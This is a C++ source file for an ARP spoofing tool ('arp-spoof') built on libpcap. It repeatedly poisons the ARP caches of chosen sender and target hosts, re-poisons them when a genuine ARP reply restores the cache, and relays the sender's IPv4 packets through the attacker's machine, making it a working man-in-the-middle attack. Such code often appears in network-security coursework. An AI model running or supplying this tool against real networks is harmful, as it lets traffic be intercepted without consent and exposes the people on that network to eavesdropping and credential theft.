#include "util.h"
#include <vector>
#include <iostream>

typedef struct {
    uint32_t ip_send;
    uint32_t ip_tar;
} thrArg;

#define ARP_SIZE 42

struct IpMacPair{
	IpMacPair(const char* ip, const uint8_t* mac) {
		strncpy(ip_addr, ip, sizeof(ip_addr) - 1);
		ip_addr[sizeof(ip_addr) - 1] = '\0';
		memcpy(mac_addr, mac, Mac::SIZE);
	}
	char ip_addr[20]={0,};
	uint8_t mac_addr[20]={0,};
};
std::vector<IpMacPair> ip_mac_table;
bool findMacByIp(const std::vector<IpMacPair>& dict, const char* ip_str, uint8_t* mac_out) {
    for (const auto& pair : dict) {
        if (strcmp(pair.ip_addr,ip_str)==0) {
            std::memcpy(mac_out, pair.mac_addr, 6);
            return true;
        }
    }
    return false;
}

char ifn[10];

char ip_atck[20];
uint8_t mac_atck[20];


void* infect(void* arg){
	thrArg *args = (thrArg*)arg;

	// Err Setting
	char errbuf[PCAP_ERRBUF_SIZE];

	EthArpPacket packet;
	struct pcap_pkthdr *pkth;
	const u_char *pkt_data;

	
	char ip_send[20]={0,}, ip_tar[20]={0,};
	uint8_t mac_send[20], mac_tar[20];

	
	IntIpChar(ip_send, args->ip_send);
	IntIpChar(ip_tar, args->ip_tar);
	
	// Load MAC Address
    if (!findMacByIp(ip_mac_table, ip_send, mac_send)) {
        fprintf(stderr, "Could not find MAC address for IP: %s\n", ip_send);
        pthread_exit(NULL);
    }
    if (!findMacByIp(ip_mac_table, ip_tar, mac_tar)) {
        fprintf(stderr, "Could not find MAC address for IP: %s\n", ip_tar);
        pthread_exit(NULL);
    }

	// Open PCAP
	pcap_t* hd = pcap_open_live(ifn, ARP_SIZE, 1, 1, errbuf);
	if (hd == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", ifn, errbuf);
		pthread_exit(NULL);
	}
	
	while(1){
		change_arp_table(hd, ip_send, ip_tar, ip_atck, mac_send, mac_atck);
		change_arp_table(hd, ip_tar, ip_send, ip_atck, mac_tar, mac_atck);
		sleep(1);
	}

	pcap_close(hd);
	pthread_exit(NULL);

}


void* attack(void* arg){
	thrArg *args = (thrArg*)arg;

	// Err Setting
	char errbuf[PCAP_ERRBUF_SIZE];

	EthArpPacket packet;
	struct pcap_pkthdr *pkth;
	const u_char *pkt_data;

	
	char ip_send[20]={0,}, ip_tar[20]={0,};
	uint8_t mac_send[20], mac_tar[20];

	
	IntIpChar(ip_send, args->ip_send);
	IntIpChar(ip_tar, args->ip_tar);
	
	// Load MAC Address
    if (!findMacByIp(ip_mac_table, ip_send, mac_send)) {
        fprintf(stderr, "Could not find MAC address for IP: %s\n", ip_send);
        exit(1);
    }
    if (!findMacByIp(ip_mac_table, ip_tar, mac_tar)) {
        fprintf(stderr, "Could not find MAC address for IP: %s\n", ip_tar);
        exit(1);
    }

	printf("\n\n****Mac Addr Capture Success!****\n\n");

	// Open PCAP
	pcap_t* hd = pcap_open_live(ifn, ARP_SIZE, 1, 1, errbuf);
	if (hd == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", ifn, errbuf);
		return 0;
	}

	pthread_t arp_thread;
    if (pthread_create(&arp_thread, NULL, infect, (void*)args) != 0) {
        perror("pthread_create for Target ARP table infection failed");
        pcap_close(hd);
        pthread_exit(NULL);
    }
    pthread_detach(arp_thread); // Let the ARP sending thread run independently
	

	printf("\n\n****ARP Table Infected!****\n\n");

	struct EthHdr *eth_hdr;
	struct ArpHdr *arp_hdr;
	struct IpHdr *ip_hdr;
	int res;
	
	while(1){
		res = pcap_next_ex(hd, &pkth, &pkt_data);
		if (res != 1) {
			fprintf(stderr, "pcap_next_ex return %d error=%s\n", res, pcap_geterr(hd));
			return 0;
		}
	
		eth_hdr = (EthHdr*)pkt_data;
		
		// If packet is ARP
		if(ntohs(eth_hdr->type_) == EthHdr::Arp){
			arp_hdr = (ArpHdr*)(eth_hdr + 1);
			if(ntohl(Ip(arp_hdr->sip_)) == Ip(ip_tar) && arp_hdr->smac_==Mac(mac_tar) && ntohs(arp_hdr->op_) == ArpHdr::Reply){
				printf("Sender ARP Table Recovered!\n");
				change_arp_table(hd, ip_send, ip_tar, ip_atck, mac_send, mac_atck);
			}	
		}

		// If packet is IPV4
		else if(ntohs(eth_hdr->type_) == EthHdr::Ip4){
			ip_hdr = (IpHdr*)(eth_hdr + 1);
			if(Ip(ip_tar) != Ip(ip_atck) && (uint32_t)Ip(ip_send) == ntohl(Ip(ip_hdr->ip_src))){
				printf("Relay\ndestination: %s\n\n", ip_tar);
				eth_hdr->smac_ = Mac(mac_atck);
				eth_hdr->dmac_ = Mac(mac_tar);
				res = pcap_sendpacket(hd, pkt_data, pkth->len);
				if (res != 0) {
					fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(hd));
					break;
				}
			}

		}
		
	}

	pcap_close(hd);
	pthread_exit(NULL);

}

void usage() {
	printf("syntax : arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
	printf("sample : arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}

int main(int argc, char* argv[]) {
	
	if (argc%2 != 0 || argc < 4) {
		usage();
		return -1;
	}

	strcpy(ifn, argv[1]);
	get_ip(ifn,ip_atck);
	get_mac(ifn,mac_atck);

	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* hd = pcap_open_live(ifn, ARP_SIZE, 1, 1, errbuf);
	if (hd == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", ifn, errbuf);
		exit(1);
	}

	uint8_t mac_tmp[10];
	for(int i = 2; i < argc; i++) {
		request_mac(hd,argv[i],mac_atck,ip_atck,mac_tmp);
		ip_mac_table.emplace_back(argv[i],mac_tmp);
	}

	// Show ip_mac_table
	 for (const auto& item : ip_mac_table) {
        std::cout << "IP: " << item.ip_addr << ", MAC: ";
        for (int i = 0; i < Mac::SIZE; ++i) {
            printf("%02x%s", item.mac_addr[i], (i < Mac::SIZE - 1) ? ":" : "");
        }
		printf("\n");
    }

	pthread_t thread;
	thrArg *arg;
	for(int i = 2; i < argc; i += 2) {
		arg = (thrArg*)malloc(sizeof(thrArg));
		if (arg == nullptr) {
			perror("malloc failed");
			exit(1);
		}
		arg->ip_send = Ip(argv[i]);
		arg->ip_tar = Ip(argv[i+1]);

		if (pthread_create(&thread, NULL, attack, (void*)arg) != 0) {
			perror("pthread_create failed");
			free(arg);
			exit(1);
		}
		pthread_detach(thread);
	}
	pcap_close(hd);

    while(1) sleep(1);


}
